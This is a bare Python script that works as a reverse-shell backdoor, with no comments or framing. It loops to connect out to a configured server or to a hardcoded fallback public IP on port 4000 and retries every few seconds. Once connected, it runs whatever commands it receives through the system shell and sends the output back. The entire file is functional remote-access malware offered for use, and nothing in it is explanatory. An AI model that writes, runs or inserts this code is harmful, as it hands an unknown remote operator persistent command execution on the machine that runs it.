import subprocess
import socket
import time

target_ip = ''  # SET TO SERVER IP
target_port = 4000
fallback_ip = '98.223.166.122'

while True:
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected = False

    while not connected:
        try:
            connection.connect((target_ip, target_port))
            connected = True

        except: 
            try:
                connection.connect((fallback_ip, target_port))
                connected = True

            except:
                time.sleep(3)

    while True:
        try:
            command = connection.recv(4024).decode('utf-8')

            if command == 'exit':
                connection.close()
                break

            elif command == 'test':
                result = 'Test Complete'

            else:
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    result = result.stdout + result.stderr

                    if result.strip() == '':
                        result = 'NOTHING RETURNED'

                except Exception as error:
                    result = 'COMMAND ERROR: ' + str(error)

            connection.sendall(str(len(result)).encode('utf-8'))
            time.sleep(0.1)
            connection.sendall(result.encode('utf-8'))

        except:
            break
